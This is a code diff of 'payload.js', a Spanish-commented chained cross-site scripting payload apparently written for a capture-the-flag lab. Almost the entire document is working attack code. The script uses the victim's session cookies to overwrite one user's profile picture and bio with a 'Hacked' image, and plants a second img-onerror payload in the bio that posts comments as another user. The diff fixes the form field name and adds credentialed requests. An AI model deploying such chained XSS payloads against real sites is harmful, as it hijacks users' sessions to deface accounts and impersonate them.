@@ -1,5 +1,5 @@
 // payload.js - XSS Chain para CTF: Actualiza pic/bio de Pepe con canvas "Hacked" + inyecta XSS2 para comentario de Jeni
-// Uso: <script src="https://tu-username.github.io/tu-repo/payload.js"></script> en el form de comentario
+// CORREGIDO: Usa 'comment' en lugar de 'comentario'
 
 // Crea canvas para imagen "Hacked"
 var canvas = document.createElement('canvas');
@@ -12,17 +12,18 @@ ctx.fillStyle = 'red';
 ctx.font = 'bold 30px sans-serif';
 ctx.fillText('Hacked', 20, 85);
 
-// XSS2 para bio: POST comentario como Jeni (usa bypass <img> si <script> filtrado)
-var xss2 = '<img src=x onerror="var fd = new FormData(); fd.append(\'comentario\', \'¡Hola HackLab! Soy jeni comentando desde biografías. #XSSChain\'); fetch(\'/comments\', {method: \'POST\', body: fd}).then(() => console.log(\'Comentario de Jeni enviado!\')); console.log(\'XSS2 ejecutado en bio!\');"> <p>Curiosidad + código = poder. Experto en Ciberseguridad. (Actualizado por hacklab)</p>';
+// XSS2 para bio: POST comentario como Jeni - CORREGIDO: 'comment' en lugar de 'comentario'
+var xss2 = '<img src=x onerror="var fd = new FormData(); fd.append(\'comment\', \'¡Hola HackLab! Soy jeni comentando desde biografías. #XSSChain\'); fetch(\'/comments\', {method: \'POST\', credentials: \'include\', body: fd}).then(() => console.log(\'Comentario de Jeni enviado!\')); console.log(\'XSS2 ejecutado en bio!\');"> <p>Curiosidad + código = poder. Experto en Ciberseguridad. (Actualizado por hacklab)</p>';
 
 // Convertir canvas a Blob y enviar update a /profile
 canvas.toBlob(function(blob) {
   var formData = new FormData();
   formData.append('bio', xss2);
   formData.append('profile_pic', blob, 'hacked.jpg');
-  // Si hay CSRF, agrega: formData.append('csrf_token', document.querySelector('input[name="csrf_token"]').value || '');
+  
   fetch('/profile', {
     method: 'POST',
+    credentials: 'include',
     body: formData
   }).then(r => {
     if (r.ok) {
